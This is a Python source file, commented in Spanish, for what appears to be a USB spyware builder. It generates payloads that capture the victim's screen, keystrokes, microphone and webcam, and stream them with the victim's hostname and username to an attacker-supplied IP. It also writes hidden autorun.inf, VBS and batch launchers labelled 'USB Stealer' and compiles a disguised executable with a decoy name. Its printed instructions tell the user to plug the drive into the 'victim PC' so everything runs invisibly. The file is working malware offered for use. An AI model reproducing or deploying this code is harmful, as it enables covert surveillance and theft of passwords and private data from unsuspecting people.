import platform
import os
import subprocess
import struct
import ctypes
import time
import shutil
from pathlib import Path

SYSTEM = platform.system()


def _read_crypto_source():
    """Lee el código fuente de crypto.py para embebir en los payloads"""
    crypto_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), "utils", "crypto.py")
    with open(crypto_path, 'r', encoding='utf-8') as f:
        return f.read()


# =====================================================================
#  GENERADORES DE PAYLOAD — cada uno devuelve bytes listos para .pyw
# =====================================================================

def get_screen_payload(ip, port, fps, quality, monitor, auto_reconnect):
    """Payload autocontenido para captura de pantalla"""
    crypto_src = _read_crypto_source()
    payload = '''#!/usr/bin/env python3
import socket
import time
import struct
import json
import platform
import os
import sys
import threading
import hashlib

try:
    import mss
except ImportError:
    subprocess.run(["pip", "install", "mss", "-q"], capture_output=True)
    import mss

try:
    from PIL import Image
    import io
except ImportError:
    subprocess.run(["pip", "install", "Pillow", "-q"], capture_output=True)
    from PIL import Image
    import io

# ===== CRYPTO =====
''' + crypto_src + '''
# ===== FIN CRYPTO =====

ip = "''' + ip + '''"
port = ''' + str(port) + '''
fps = ''' + str(fps) + '''
quality = ''' + str(quality) + '''
monitor = ''' + str(monitor) + '''
auto_reconnect = ''' + str(auto_reconnect) + '''

def do_handshake(sock, mode_name):
    iv = generate_iv()
    key = derive_key("crock_default_key_change_me_2024")
    cipher = AESCipher(key, iv)
    info = {
        "hostname": socket.gethostname(),
        "username": os.getlogin(),
        "os": platform.system(),
        "mode": mode_name
    }
    info_json = json.dumps(info).encode('utf-8')
    enc_info = cipher.process(info_json)
    sock.sendall(struct.pack('>4s16sI', b'CRCK', iv, len(enc_info)) + enc_info)
    return cipher

def send_frames():
    max_retries = 3 if auto_reconnect else 1
    retries = 0
    
    while retries < max_retries:
        s = None
        cipher = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.settimeout(5)
            s.connect((ip, port))
            retries = 0
            cipher = do_handshake(s, "screen")
            
            with mss.mss() as sct:
                monitor_obj = sct.monitors[monitor] if monitor < len(sct.monitors) else sct.monitors[0]
                
                while True:
                    try:
                        frame = sct.grab(monitor_obj)
                        
                        img = Image.frombytes("RGB", frame.size, frame.bgra, "raw", "BGRX")
                        
                        scale_percent = 85 
                        width = int(frame.width * scale_percent / 100)
                        height = int(frame.height * scale_percent / 100)
                        img = img.resize((width, height), Image.Resampling.BILINEAR)

                        buf = io.BytesIO()
                        img.save(buf, format="JPEG", quality=max(quality, 75))
                        data = buf.getvalue()

                        size_enc = cipher.process(struct.pack('>I', len(data)))
                        data_enc = cipher.process(data)
                        s.sendall(size_enc + data_enc)
                        
                        time.sleep(1/fps)
                    except (BrokenPipeError, ConnectionResetError):
                        break
                    except Exception:
                        break
            
            if not auto_reconnect:
                break
            retries += 1
            time.sleep(2)
            
        except socket.timeout:
            if s:
                try: s.close()
                except: pass
            s = None
            retries += 1
            if auto_reconnect and retries < max_retries:
                time.sleep(2)
            else:
                break
        except Exception:
            if s:
                try: s.close()
                except: pass
            retries += 1
            if auto_reconnect and retries < max_retries:
                time.sleep(2)
            else:
                break
    
    sys.exit(0)

if __name__ == "__main__":
    send_frames()
'''
    return payload.encode('utf-8')


def get_keylogger_payload(ip, port, auto_reconnect):
    """Payload autocontenido para captura de teclas"""
    crypto_src = _read_crypto_source()
    payload = '''#!/usr/bin/env python3
import socket
from pynput import keyboard
import time
import sys
import threading
import json
import platform
import os
import queue
import struct
import hashlib

# ===== CRYPTO =====
''' + crypto_src + '''
# ===== FIN CRYPTO =====

ip = "''' + ip + '''"
port = ''' + str(port) + '''
auto_reconnect = ''' + str(auto_reconnect) + '''

key_queue = queue.Queue()
s = None
cipher = None

def do_handshake(sock, mode_name):
    iv = generate_iv()
    key = derive_key("crock_default_key_change_me_2024")
    c = AESCipher(key, iv)
    info = {
        "hostname": socket.gethostname(),
        "username": os.getlogin(),
        "os": platform.system(),
        "mode": mode_name
    }
    info_json = json.dumps(info).encode('utf-8')
    enc_info = c.process(info_json)
    sock.sendall(struct.pack('>4s16sI', b'CRCK', iv, len(enc_info)) + enc_info)
    return c

def maintain_connection():
    global s, cipher
    max_retries = 3 if auto_reconnect else 1
    retries = 0
    
    while True:
        try:
            if s is None:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.settimeout(5)
                s.connect((ip, port))
                retries = 0
                cipher = do_handshake(s, "keylogger")
            
            while not key_queue.empty():
                try:
                    data = key_queue.get(timeout=1)
                    data_bytes = data.encode() if isinstance(data, str) else data
                    s.sendall(cipher.process(data_bytes))
                except queue.Empty:
                    pass
            
            time.sleep(0.1)
        except (BrokenPipeError, ConnectionResetError):
            try: s.close()
            except: pass
            s = None
            cipher = None
            if auto_reconnect and retries < max_retries:
                retries += 1
                time.sleep(2)
            else:
                break
        except socket.timeout:
            try: s.close()
            except: pass
            s = None
            cipher = None
            if auto_reconnect and retries < max_retries:
                retries += 1
                time.sleep(2)
            else:
                break
        except Exception:
            try: s.close()
            except: pass
            s = None
            cipher = None
            if auto_reconnect and retries < max_retries:
                retries += 1
                time.sleep(2)
            else:
                break

def on_press(key):
    try:
        if hasattr(key, 'char') and key.char:
            key_queue.put(key.char)
        elif hasattr(key, 'name'):
            key_queue.put(f"[{key.name}]")
        else:
            key_queue.put("[UNKNOWN]")
    except:
        pass

try:
    conn_thread = threading.Thread(target=maintain_connection, daemon=True)
    conn_thread.start()
    
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    listener.join()
except KeyboardInterrupt:
    pass
finally:
    try:
        if s:
            s.close()
    except:
        pass
    sys.exit(0)
'''
    return payload.encode('utf-8')


def get_microphone_payload(ip, port, auto_reconnect):
    """Payload autocontenido para captura de audio"""
    crypto_src = _read_crypto_source()
    payload = '''#!/usr/bin/env python3
import socket
import pyaudio
import struct
import json
import platform
import os
import hashlib

# ===== CRYPTO =====
''' + crypto_src + '''
# ===== FIN CRYPTO =====

ip = "''' + ip + '''"
port = ''' + str(port) + '''

CHUNK = 1024
FORMAT = pyaudio.paFloat32
CHANNELS = 2
RATE = 44100

p = pyaudio.PyAudio()
stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)

try:
    s = socket.socket()
    s.connect((ip, port))
    iv = generate_iv()
    key = derive_key("crock_default_key_change_me_2024")
    cipher = AESCipher(key, iv)
    info = {
        "hostname": socket.gethostname(),
        "username": os.getlogin(),
        "os": platform.system(),
        "mode": "microphone"
    }
    info_json = json.dumps(info).encode('utf-8')
    enc_info = cipher.process(info_json)
    s.sendall(struct.pack('>4s16sI', b'CRCK', iv, len(enc_info)) + enc_info)
    
    while True:
        data = stream.read(CHUNK)
        s.sendall(cipher.process(data))
except:
    pass
finally:
    stream.stop_stream()
    stream.close()
    p.terminate()
'''
    return payload.encode('utf-8')


def get_camera_payload(ip, port, auto_reconnect):
    """Payload autocontenido para captura de cámara"""
    crypto_src = _read_crypto_source()
    payload = '''#!/usr/bin/env python3
import socket
import cv2
import struct
import json
import platform
import os
import hashlib

# ===== CRYPTO =====
''' + crypto_src + '''
# ===== FIN CRYPTO =====

ip = "''' + ip + '''"
port = ''' + str(port) + '''

try:
    cap = cv2.VideoCapture(0)
    s = socket.socket()
    s.connect((ip, port))
    
    iv = generate_iv()
    key = derive_key("crock_default_key_change_me_2024")
    cipher = AESCipher(key, iv)
    info = {
        "hostname": socket.gethostname(),
        "username": os.getlogin(),
        "os": platform.system(),
        "mode": "camera"
    }
    info_json = json.dumps(info).encode('utf-8')
    enc_info = cipher.process(info_json)
    s.sendall(struct.pack('>4s16sI', b'CRCK', iv, len(enc_info)) + enc_info)
    
    while True:
        ret, frame = cap.read()
        if ret:
            resized = cv2.resize(frame, (640, 480))
            data = cv2.imencode('.jpg', resized)[1].tobytes()
            size_enc = cipher.process(struct.pack('>I', len(data)))
            data_enc = cipher.process(data)
            s.sendall(size_enc + data_enc)
except:
    pass
finally:
    cap.release()
'''
    return payload.encode('utf-8')


# =====================================================================
#  DETECCIÓN DE DRIVES
# =====================================================================

def detect_all_drives():
    """Detecta todas las unidades (USB + otros)"""
    drives = {}
    
    if SYSTEM == "Windows":
        try:
            bitmask = ctypes.windll.kernel32.GetLogicalDrives()
            for i in range(26):
                if bitmask & (1 << i):
                    drive = chr(65 + i)
                    drive_path = f"{drive}:\\"
                    
                    try:
                        drive_type = ctypes.windll.kernel32.GetDriveTypeA(drive_path.encode())
                        
                        type_name = {
                            1: "UNKNOWN",
                            2: "USB/REMOVIBLE",
                            3: "DISCO DURO",
                            4: "RED",
                            5: "CD/DVD",
                            6: "RAM DISK"
                        }.get(drive_type, "DESCONOCIDO")
                        
                        drives[drive] = type_name
                    except:
                        pass
        except Exception as e:
            print(f"[-] Error detectando drives: {e}")
    
    return drives

def select_usb_drive():
    """Permite seleccionar una unidad USB - SOLO REMOVIBLES"""
    all_drives = detect_all_drives()
    
    print("\n" + "█"*60)
    print("  SELECCIONAR UNIDAD USB")
    print("█"*60 + "\n")
    
    usb_drives = {k: v for k, v in all_drives.items() if "USB" in v or "REMOVIBLE" in v}
    
    if usb_drives:
        print("[*] UNIDADES USB DETECTADAS:")
        for idx, (drive, drive_type) in enumerate(usb_drives.items(), 1):
            print(f"    {idx}. {drive}:\\ - {drive_type}")
        print("")
    else:
        print("[-] No se detectaron USBs removibles")
        print("[*] Conecta una USB y presiona Ctrl+C para reintentar\n")
        return None
    
    print("[*] O ingresa la letra de la unidad manualmente (A-Z)\n")
    
    while True:
        try:
            choice = input("[*] Selecciona unidad (número o letra): ").strip().upper()
            
            if not choice:
                print("[-] Debes ingresar algo")
                continue
            
            try:
                idx = int(choice) - 1
                usb_items = list(usb_drives.items())
                if 0 <= idx < len(usb_items):
                    selected_drive = usb_items[idx][0]
                    print(f"[+] Unidad seleccionada: {selected_drive}:\\")
                    return selected_drive
                else:
                    print(f"[-] Número fuera de rango (1-{len(usb_items)})")
                    continue
            except ValueError:
                pass
            
            if len(choice) == 1 and 'A' <= choice <= 'Z':
                drive_path = f"{choice}:\\"
                if os.path.exists(drive_path):
                    try:
                        drive_type = ctypes.windll.kernel32.GetDriveTypeA(drive_path.encode())
                        if drive_type == 2:
                            print(f"[+] Unidad seleccionada: {choice}:\\")
                            return choice
                        else:
                            print(f"[-] La unidad {choice}: no es removible. Solo USBs permitidas.")
                            continue
                    except:
                        print(f"[-] Error verificando tipo de unidad {choice}:")
                        continue
                else:
                    print(f"[-] La unidad {choice}: no existe o no es accesible")
                    continue
            
            print("[-] Entrada inválida. Ingresa un número o una letra USB (A-Z)")
                
        except KeyboardInterrupt:
            print("\n[!] Operación cancelada")
            return None
        except Exception as e:
            print(f"[-] Error: {e}")


# =====================================================================
#  ARCHIVOS DE APOYO (autorun, vbs, bat, icon)
# =====================================================================

def create_autorun_inf(usb_path, icon_file="icon.ico"):
    """Crea archivo autorun.inf"""
    autorun_content = """[autorun]
open=run.vbs
icon=icon.ico
label=USB Stealer
action=Abrir Archivo
shell\\open\\command=run.vbs
shellexecute=1
"""
    
    autorun_path = os.path.join(usb_path, "autorun.inf")
    try:
        if os.path.exists(autorun_path):
            try: os.remove(autorun_path)
            except: pass
        
        with open(autorun_path, 'w', encoding='utf-8') as f:
            f.write(autorun_content)
        
        if os.path.exists(autorun_path) and os.path.getsize(autorun_path) > 0:
            subprocess.run(f'attrib +h +s "{autorun_path}"', shell=True, capture_output=True)
            print(f"[+] autorun.inf creado y configurado")
            return True
        else:
            print(f"[-] El archivo autorun.inf no se guardó correctamente")
            return False
            
    except PermissionError:
        print(f"[-] Permiso denegado al crear autorun.inf")
        return False
    except Exception as e:
        print(f"[-] Error creando autorun.inf: {e}")
        return False

def create_vbs_runner(usb_path):
    """Crea archivo VBS para ejecutar el payload silenciosamente"""
    vbs_content = """
On Error Resume Next

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

strPath = objFSO.GetParentFolderName(WScript.ScriptFullName)

' Ejecutar payload.pyw silenciosamente
Set objFile = objFSO.GetFile(strPath & "\\payload.pyw")
If objFSO.FileExists(objFile) Then
    objShell.Run "pythonw " & Chr(34) & objFile & Chr(34), 0, False
End If
"""
    
    vbs_path = os.path.join(usb_path, "run.vbs")
    try:
        if os.path.exists(vbs_path):
            try: os.remove(vbs_path)
            except: pass
        
        with open(vbs_path, 'w', encoding='utf-8') as f:
            f.write(vbs_content)
        
        if os.path.exists(vbs_path) and os.path.getsize(vbs_path) > 0:
            subprocess.run(f'attrib +h "{vbs_path}"', shell=True, capture_output=True)
            print(f"[+] Script VBS creado: run.vbs (oculto)")
            return True
        else:
            print(f"[-] El archivo run.vbs no se guardó correctamente")
            return False
            
    except PermissionError:
        print(f"[-] Permiso denegado al crear run.vbs")
        return False
    except Exception as e:
        print(f"[-] Error creando VBS: {e}")
        return False

def create_batch_runner(usb_path):
    """Crea archivo batch para ejecutar con click derecho"""
    batch_content = """@echo off
setlocal enabledelayedexpansion

set "scriptPath=%~dp0"

if exist "%scriptPath%payload.pyw" (
    start /b pythonw "%scriptPath%payload.pyw"
)

attrib +h "%scriptPath%payload.pyw"
attrib +h "%scriptPath%run.vbs"
attrib +h "%scriptPath%autorun.inf"
attrib +h "%scriptPath%icon.ico"
attrib +h "%scriptPath%desktop.ini"

exit /b 0
"""
    
    batch_path = os.path.join(usb_path, "run.bat")
    try:
        if os.path.exists(batch_path):
            try: os.remove(batch_path)
            except: pass
        
        with open(batch_path, 'w', encoding='utf-8') as f:
            f.write(batch_content)
        
        if os.path.exists(batch_path) and os.path.getsize(batch_path) > 0:
            subprocess.run(f'attrib +h "{batch_path}"', shell=True, capture_output=True)
            print(f"[+] Script Batch creado: run.bat (oculto)")
            return True
        else:
            print(f"[-] El archivo run.bat no se guardó correctamente")
            return False
            
    except PermissionError:
        print(f"[-] Permiso denegado al crear run.bat")
        return False
    except Exception as e:
        print(f"[-] Error creando Batch: {e}")
        return False

def create_icon_file(usb_path):
    """Crea un archivo .ico personalizado"""
    icon_path = os.path.join(usb_path, "icon.ico")
    
    ico_data = bytes([
        0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x20, 0x20,
        0x00, 0x00, 0x01, 0x00, 0x18, 0x00, 0x68, 0x00,
        0x00, 0x00, 0x16, 0x00, 0x00, 0x00,
        0x28, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00,
        0x40, 0x00, 0x00, 0x00, 0x01, 0x00, 0x18, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00
    ])
    ico_data += bytes(1024)
    
    try:
        if os.path.exists(icon_path):
            try: os.remove(icon_path)
            except: pass
        
        with open(icon_path, 'wb') as f:
            f.write(ico_data)
        
        if os.path.exists(icon_path) and os.path.getsize(icon_path) > 0:
            subprocess.run(f'attrib +h "{icon_path}"', shell=True, capture_output=True)
            print(f"[+] Icono personalizado creado: icon.ico (oculto)")
            return True
        else:
            print(f"[-] El archivo icon.ico no se guardó correctamente")
            return False
            
    except PermissionError:
        print(f"[-] Permiso denegado al crear icon.ico")
        return False
    except Exception as e:
        print(f"[-] Error creando icono: {e}")
        return False


# =====================================================================
#  FUNCIÓN PRINCIPAL — PREPARA LA USB
# =====================================================================

def prepare_usb_interactive(ip, port, mode, fps, quality, monitor, hide_console, auto_reconnect):
    """Prepara la USB generando directamente un ejecutable standalone"""
    print("\n" + "█"*60)
    print(f"  PREPARAR USB (EXE) - MODO {mode.upper()}")
    print("█"*60)
    
    # Seleccionar USB
    usb_drive = select_usb_drive()
    if not usb_drive:
        print("\n[-] Se canceló la preparación de USB")
        input("\nPresiona Enter...")
        return
    
    usb_path = f"{usb_drive}:\\"
    
    # Verificar acceso
    print(f"\n[*] Verificando acceso a USB: {usb_path}")
    try:
        if not os.path.exists(usb_path):
            print(f"[-] No se puede acceder a {usb_path}")
            input("\nPresiona Enter...")
            return
        
        test_file = os.path.join(usb_path, ".crock_test_1")
        try:
            with open(test_file, 'w') as f:
                f.write("test")
            os.remove(test_file)
            print(f"[+] Acceso de escritura confirmado")
        except PermissionError:
            print(f"[-] ¡USB PROTEGIDA CONTRA ESCRITURA!")
            print(f"[!] Desactiva la protección en USB y reintenta")
            input("\nPresiona Enter...")
            return
        except Exception as e:
            print(f"[-] Error al probar escritura: {e}")
            input("\nPresiona Enter...")
            return
            
    except Exception as e:
        print(f"[-] Error verificando USB: {e}")
        input("\nPresiona Enter...")
        return
    
    # Importar funciones para crear el EXE
    try:
        from builder.exe_builder import create_exe_stub, build_exe
    except ImportError:
        print("[-] No se pudo importar builder.exe_builder")
        input("\nPresiona Enter...")
        return

    # Preguntar por nombre e icono
    app_name = input("\n[*] Nombre del ejecutable (ej. Google Chrome) [SystemRun]: ").strip()
    if not app_name:
        app_name = "SystemRun"
    if not app_name.lower().endswith(".exe"):
        app_name += ".exe"
        
    decoy_url = input("[*] URL a redireccionar al abrir (ej. https://google.com) [vacio=abrir explorer]: ").strip()
        
    icon_path = input("[*] Ruta del icono .ico o URL directa (opcional, Enter para omitir): ").strip()
    
    downloaded_icon = None
    if icon_path.startswith("http://") or icon_path.startswith("https://"):
        print(f"[*] Descargando icono desde la red...")
        import urllib.request
        try:
            downloaded_icon = os.path.join(usb_path, "temp_icon.ico")
            urllib.request.urlretrieve(icon_path, downloaded_icon)
            icon_path = downloaded_icon
            print(f"[+] Icono descargado exitosamente.")
        except Exception as e:
            print(f"[-] Error descargando icono: {e}")
            icon_path = ""
            
    elif icon_path and not os.path.exists(icon_path):
        print("[-] Icono local no encontrado, se compilara sin icono especial.")
        icon_path = ""

    print(f"\n[*] Generando código base para el ejecutable...")
    launcher_py = create_exe_stub(usb_path, ip, port, fps, quality, monitor, auto_reconnect, mode, decoy_url=decoy_url)
    
    if launcher_py:
        print(f"\n[*] Compilando a ejecutable standalone. Esto puede tomar unos minutos...")
        exe_created = build_exe(usb_path, launcher_py, app_name, icon_path)
        
        if exe_created:
            print("\n" + "="*60)
            print(f"[+] ¡USB PREPARADA EXITOSAMENTE!")
            print("="*60)
            print(f"[+] Unidad: {usb_path}")
            print(f"[+] Archivo: {os.path.join(usb_path, app_name)}")
            print(f"\n[*] INSTRUCCIONES DE USO:")
            print(f"  Simplemente conecta la USB en la PC víctima y haz doble click")
            print(f"  en '{app_name}'. Todo se ejecutará de forma silenciosa e invisible.")
            print("="*60)
        else:
            print(f"\n[-] Hubo un error al compilar el ejecutable.")
            
        # Limpiar el script temporal y el ícono si se descargó
        try:
            if os.path.exists(launcher_py):
                os.remove(launcher_py)
            if downloaded_icon and os.path.exists(downloaded_icon):
                os.remove(downloaded_icon)
        except:
            pass
            
    input("\nPresiona Enter...")
